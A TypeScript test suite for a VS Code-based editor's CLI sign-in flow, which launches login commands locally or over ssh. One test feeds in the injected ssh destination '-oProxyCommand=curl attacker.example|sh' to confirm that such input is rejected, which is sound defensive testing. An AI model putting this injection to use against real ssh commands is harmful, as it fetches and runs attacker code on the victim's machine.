/*---------------------------------------------------------------------------------------------
 *  wisp: not part of Code - OSS. Edit editor/overlay in the wisp repo, not this copy.
 *--------------------------------------------------------------------------------------------*/

import assert from 'assert';
import { Emitter } from '../../../../../base/common/event.js';
import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../../base/test/common/utils.js';
import { INotificationService } from '../../../../../platform/notification/common/notification.js';
import type { DetectedCli } from '../../../../../platform/wisp/common/wispProtocol.js';
import type { ICreateTerminalOptions, ITerminalInstance, ITerminalService } from '../../../../../workbench/contrib/terminal/browser/terminal.js';
import { IWispAccountsService } from '../../browser/wispAccounts.js';
import { WispSignInFlow } from '../../browser/wispSignIn.js';

function cli(overrides: Partial<DetectedCli> = {}): DetectedCli {
	return { cli: 'claude', installed: true, ...overrides };
}

/** Records every `createAndFocusTerminal` call and hands back a fake instance whose exit the test fires itself. */
class FakeTerminalService {
	readonly created: ICreateTerminalOptions[] = [];
	private readonly exit = new Emitter<number | undefined>();
	private failNext = false;

	readonly onExit = this.exit.event;

	async createAndFocusTerminal(options?: ICreateTerminalOptions): Promise<ITerminalInstance> {
		if (this.failNext) {
			this.failNext = false;
			throw new Error('spawn failed');
		}
		this.created.push(options!);
		return { onExit: this.exit.event } as unknown as ITerminalInstance;
	}

	fireExit(code: number | undefined = 0): void {
		this.exit.fire(code);
	}

	failNextCreate(): void {
		this.failNext = true;
	}
}

class FakeAccountsService {
	refreshCalls = 0;
	async refreshClis(): Promise<void> {
		this.refreshCalls++;
	}
}

class FakeNotificationService {
	readonly errors: string[] = [];
	error(message: string): void {
		this.errors.push(message);
	}
}

suite('wisp: sign-in flow', () => {

	ensureNoDisposablesAreLeakedInTestSuite();

	test('opens a terminal running the CLI\'s login command on the local host', async () => {
		const terminal = new FakeTerminalService();
		const accounts = new FakeAccountsService();
		const notifications = new FakeNotificationService();
		const flow = new WispSignInFlow(terminal as unknown as ITerminalService, accounts as unknown as IWispAccountsService, notifications as unknown as INotificationService);

		await flow.run(cli({ cli: 'claude' }), 'local');

		assert.strictEqual(terminal.created.length, 1);
		assert.strictEqual(terminal.created[0].config && 'executable' in terminal.created[0].config ? terminal.created[0].config.executable : undefined, 'claude');
		assert.deepStrictEqual(terminal.created[0].config && 'args' in terminal.created[0].config ? terminal.created[0].config.args : undefined, ['auth', 'login']);
		assert.strictEqual(notifications.errors.length, 0);
	});

	test('builds the ssh command for a remote host', async () => {
		const terminal = new FakeTerminalService();
		const accounts = new FakeAccountsService();
		const notifications = new FakeNotificationService();
		const flow = new WispSignInFlow(terminal as unknown as ITerminalService, accounts as unknown as IWispAccountsService, notifications as unknown as INotificationService);

		await flow.run(cli({ cli: 'cursor' }), 'mac-mini');

		const config = terminal.created[0].config;
		assert.ok(config && 'executable' in config);
		assert.strictEqual(config.executable, 'ssh');
		assert.deepStrictEqual(config.args, ['-t', '--', 'mac-mini', 'env', 'NO_OPEN_BROWSER=1', 'agent', 'login']);
	});

	test('refreshes the detected CLIs once the terminal exits, whatever the exit code', async () => {
		const terminal = new FakeTerminalService();
		const accounts = new FakeAccountsService();
		const notifications = new FakeNotificationService();
		const flow = new WispSignInFlow(terminal as unknown as ITerminalService, accounts as unknown as IWispAccountsService, notifications as unknown as INotificationService);

		await flow.run(cli(), 'local');
		assert.strictEqual(accounts.refreshCalls, 0);

		terminal.fireExit(0);
		assert.strictEqual(accounts.refreshCalls, 1);
	});

	test('refreshes on exit even when the user closes the terminal instead of the CLI exiting on its own', async () => {
		const terminal = new FakeTerminalService();
		const accounts = new FakeAccountsService();
		const notifications = new FakeNotificationService();
		const flow = new WispSignInFlow(terminal as unknown as ITerminalService, accounts as unknown as IWispAccountsService, notifications as unknown as INotificationService);

		await flow.run(cli(), 'local');
		terminal.fireExit(undefined);
		assert.strictEqual(accounts.refreshCalls, 1);
	});

	test('a second exit of the same terminal does not refresh again', async () => {
		const terminal = new FakeTerminalService();
		const accounts = new FakeAccountsService();
		const notifications = new FakeNotificationService();
		const flow = new WispSignInFlow(terminal as unknown as ITerminalService, accounts as unknown as IWispAccountsService, notifications as unknown as INotificationService);

		await flow.run(cli(), 'local');
		terminal.fireExit(0);
		terminal.fireExit(0);
		assert.strictEqual(accounts.refreshCalls, 1);
	});

	test('an invalid ssh destination shows a notification and never opens a terminal', async () => {
		const terminal = new FakeTerminalService();
		const accounts = new FakeAccountsService();
		const notifications = new FakeNotificationService();
		const flow = new WispSignInFlow(terminal as unknown as ITerminalService, accounts as unknown as IWispAccountsService, notifications as unknown as INotificationService);

		await flow.run(cli(), '-oProxyCommand=curl attacker.example|sh');

		assert.strictEqual(terminal.created.length, 0);
		assert.strictEqual(notifications.errors.length, 1);
		assert.strictEqual(accounts.refreshCalls, 0);
	});

	test('a terminal that fails to open shows a notification instead of throwing', async () => {
		const terminal = new FakeTerminalService();
		terminal.failNextCreate();
		const accounts = new FakeAccountsService();
		const notifications = new FakeNotificationService();
		const flow = new WispSignInFlow(terminal as unknown as ITerminalService, accounts as unknown as IWispAccountsService, notifications as unknown as INotificationService);

		await flow.run(cli(), 'local');

		assert.strictEqual(notifications.errors.length, 1);
		assert.strictEqual(accounts.refreshCalls, 0);
	});
});
